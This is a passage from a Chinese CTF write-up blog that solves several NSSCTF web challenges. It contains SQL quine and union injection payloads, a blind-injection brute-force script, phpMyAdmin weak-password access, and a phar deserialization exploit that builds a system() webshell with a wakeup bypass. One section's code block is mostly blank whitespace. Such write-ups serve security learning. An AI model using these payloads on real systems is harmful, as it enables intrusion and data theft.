        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$FLAG</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"wrong password"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">die</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
<span class="token comment">&lt;!-- /?source --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>账号<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>密码<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>
            &lt;input type="submit" / value="登录">
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>只要查询数据库password的返回结果等于<code>$password</code>就能回显flag</p>
<p>先用预期解做，quine注入：<a href="https://c1oudfl0w0.github.io/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/#quine%E6%B3%A8%E5%85%A5">https://c1oudfl0w0.github.io/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/#quine%E6%B3%A8%E5%85%A5</a></p>
<p>过滤了空格，用<code>/**/</code>代替，过滤了<code>;</code>，用<code>#</code>代替</p>
<p>构造自产生语句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'/**/union/**/select/**/replace(replace('</span><span class="token number">1</span><span class="token string">"/**/union/**/select/**/replace(replace("</span><span class="token punctuation">.</span><span class="token string">",char(34),char(39)),char(46),"</span><span class="token punctuation">.</span><span class="token string">")#',char(34),char(39)),char(46),'1"</span><span class="token comment">/**/</span><span class="token keyword">union</span><span class="token comment">/**/</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token comment">#')#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这样就能得到flag</p>
<h2 id="非预期1"><a href="#非预期1" class="headerlink" title="非预期1"></a>非预期1</h2><p>扫描后台目录</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231017221547510.png" alt="image-20231017221547510"></p>
<p>发现phpmyadmin路由</p>
<p>访问，以用户名admin和弱密码admin进入后台</p>
<p>直接查到正确的密码，也可以loadfile写马getshell</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231017221852424.png" alt="image-20231017221852424"></p>
<h2 id="非预期2"><a href="#非预期2" class="headerlink" title="非预期2"></a>非预期2</h2><p>盲注得到密码，脚本 by debug0032</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span>time
alp <span class="token operator">=</span> <span class="token string">"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~"</span>
<span class="token keyword">def</span> <span class="token function">get_pass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">"http://1.14.71.254:28610/index.php"</span>
    flag <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> alp<span class="token punctuation">:</span>
            data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"1'or/**/password/**/like/**/'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token operator">+</span>i<span class="token punctuation">&#125;</span></span><span class="token string">%'#"</span></span><span class="token punctuation">&#125;</span>
            resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"something wrong"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                flag<span class="token operator">+=</span>i
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            <span class="token keyword">elif</span> <span class="token string">"~"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>
                <span class="token keyword">return</span>
get_pass<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="天翼杯-2021-esay-eval"><a href="#天翼杯-2021-esay-eval" class="headerlink" title="[天翼杯 2021]esay_eval"></a>[天翼杯 2021]esay_eval</h1><blockquote>
<p>反序列化+打redis&#x2F;蚁剑绕过disable_function</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <span class="token delimiter important">?></span></span>')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h1 id="SWPUCTF-2022-新生赛-xff"><a href="#SWPUCTF-2022-新生赛-xff" class="headerlink" title="[SWPUCTF 2022 新生赛]xff"></a>[SWPUCTF 2022 新生赛]xff</h1><blockquote>
<p>http</p>
</blockquote>
<ol>
<li><p>Must be accessed from Xiaohong’s own computer.</p>
<p>就是xff头设置为127.0.0.1</p>
</li>
<li><p>Must be jump from Home Page.</p>
<p>就是设置Referer为Home Page</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231019091713649.png" alt="image-20231019091713649"></p>
</li>
</ol>
<hr>
<h1 id="NSSRound-4-SWPU-1zweb"><a href="#NSSRound-4-SWPU-1zweb" class="headerlink" title="[NSSRound#4 SWPU]1zweb"></a>[NSSRound#4 SWPU]1zweb</h1><blockquote>
<p>phar反序列化文件上传+绕过stub限制</p>
</blockquote>
<p>进入题目，发现一个查询文件的框和一个上传文件的按钮</p>
<p>非预期：直接查询&#x2F;flag得到flag</p>
<p>我们先查询index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">LoveNss</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$ljt</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$dky</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ljt</span><span class="token operator">=</span><span class="token string double-quoted-string">"ljt"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dky</span><span class="token operator">=</span><span class="token string double-quoted-string">"dky"</span><span class="token punctuation">;</span>
        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ljt</span><span class="token operator">===</span><span class="token string double-quoted-string">"Misc"</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dky</span><span class="token operator">===</span><span class="token string double-quoted-string">"Re"</span><span class="token punctuation">)</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ljt</span><span class="token operator">=</span><span class="token string double-quoted-string">"Re"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dky</span><span class="token operator">=</span><span class="token string double-quoted-string">"Misc"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>文件上传的upload.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"上传异常"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$allowedExts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$allowedExts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"__HALT_COMPILER();"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$pos</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"integer"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ltj一眼就发现了phar"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./upload/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" 文件已经存在"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"上传成功 ./upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"dky不喜欢这个文件 ."</span><span class="token operator">.</span><span class="token variable">$extension</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>显然这题会用到phar反序列化，出口在<code>__destruct</code>的eval，那么就要绕过wakeup，php版本5.5.38，有cve-2016-7124</p>
<p>接下来是文件上传的部分</p>
<ul>
<li>后缀检测：php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的，可以直接修改为其他后缀</li>
<li>内容检测：将phar文件使用 <code>gzip</code> 命令进行压缩，可以看到压缩之后的文件中就没有了<code>__HALT_COMPILER()</code></li>
</ul>
<p>exp：</p>
<p>注：php.ini开启<code>phar.readonly = Off</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">LoveNss</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$ljt</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$dky</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ljt</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Misc"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dky</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Re"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system($_POST[1]);'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LoveNss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置stub</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将自定义的meta-data存入manifest，setMetadata()会将对象进行序列化</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 签名自动运算</span>
<span class="token function">rename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"phar.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 重命名</span>

<span class="token comment">// 生成后需要丢入010editor进行修改属性数量，绕过wakeup()函数</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>修改属性数量为4</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231019214554353.png" alt="image-20231019214554353"></p>
<p>注意：010Editor打开phar文件修改序列化字符串的成员个数，由于phar文件带有签名校验，需要把签名部分也改了，否则会报错。这里要用到gzip</p>
<p>gzip压缩：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha1
<span class="token keyword">import</span> gzip

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'phar.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    f <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span>  <span class="token comment"># 获取要签名的数据</span>
h <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 获取签名类型以及GBMB标识</span>
new_file <span class="token operator">=</span> s <span class="token operator">+</span> sha1<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> h  <span class="token comment"># 数据 + 签名 + (类型 + GBMB)</span>
f_gzip <span class="token operator">=</span> gzip<span class="token punctuation">.</span>GzipFile<span class="token punctuation">(</span><span class="token string">"3.png"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span>
f_gzip<span class="token punctuation">.</span>write<span class="token punctuation">(</span>new_file<span class="token punctuation">)</span>
f_gzip<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后上传3.png</p>
<p>接下来用phar伪协议读文件命令执行即可</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token operator">=</span>phar<span class="token punctuation">:</span><span class="token comment">//upload/3.png&amp;1=cat /flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="SWPUCTF-2022-新生赛-ez-sql"><a href="#SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_sql"></a>[SWPUCTF 2022 新生赛]ez_sql</h1><p>让我们get传参nss，随便填个1，发现给了两个假的flag</p>
<p>然后拿万能密码试一下</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231019220159272.png" alt="image-20231019220159272"></p>
<p>存在sql注入</p>
<p>测试一下发现空格，<code>--</code>，union，or会被替换掉，其中union可以双写绕过</p>
<p>因为会回显两列，我们这里用联合查询要查1，2列，前面填0闭合使其不回显</p>
<p>爆数据库名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">nss<span class="token operator">=</span><span class="token number">0</span>'uniunionon<span class="token comment">/**/</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到数据库名NSS_db</p>
<p>爆表名，注意or会被替换掉要双写</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">nss<span class="token operator">=</span><span class="token number">0</span>'uniunionon<span class="token comment">/**/</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment">/**/</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment">/**/</span><span class="token keyword">where</span><span class="token comment">/**/</span>table_schema<span class="token operator">=</span><span class="token string">"NSS_db"</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到表名NSS_tb,users</p>
<p>爆列名</p>
